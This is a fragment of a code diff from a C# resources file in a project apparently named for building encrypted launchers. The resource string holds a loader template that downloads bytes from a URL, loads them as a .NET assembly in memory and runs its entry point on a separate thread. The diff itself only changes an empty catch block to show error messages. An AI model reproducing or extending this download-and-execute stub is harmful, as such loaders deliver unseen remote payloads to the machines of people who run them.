@@ -129,7 +129,7 @@ namespace LuncherMakeEncryption.Properties {
         ///                var b = x.DownloadData(s);
         ///                var a = Assembly.Load(b);
         ///                m = a.EntryPoint;
-        ///} catch {};
+        ///} catch (Exception Error){MessageBox.Show(Error.Message);}
         ///w++;
         ///}).Start();.
         /// </summary>
